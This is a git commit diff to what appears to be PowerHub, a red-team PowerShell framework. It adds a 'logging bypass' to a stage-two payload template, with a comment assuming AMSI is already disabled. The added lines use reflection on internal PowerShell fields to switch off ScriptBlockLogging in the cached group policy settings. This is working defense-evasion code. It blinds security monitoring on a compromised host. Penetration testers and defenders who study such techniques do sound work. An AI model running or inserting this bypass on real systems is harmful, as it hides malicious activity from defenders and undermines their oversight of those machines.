dcbf7e5b94c0700557e607ec10dc240d5ca4c390
Adrian Vollmer <adrian.vollmer@syss.de>
2022-11-16 17:00:53 +0100

    Add logging bypass

--- powerhub/templates/powershell/stage2.ps1
+++ powerhub/templates/powershell/stage2.ps1
@@ -1,3 +1,10 @@
+{#- At this point, we assume AMSI is disabled -#}
+
+{#- Bypass PowerShell Logging: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ -#}
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
+
 $KEY = ${{symbol_name("KEY")}}
 
 function Encrypt-AES {
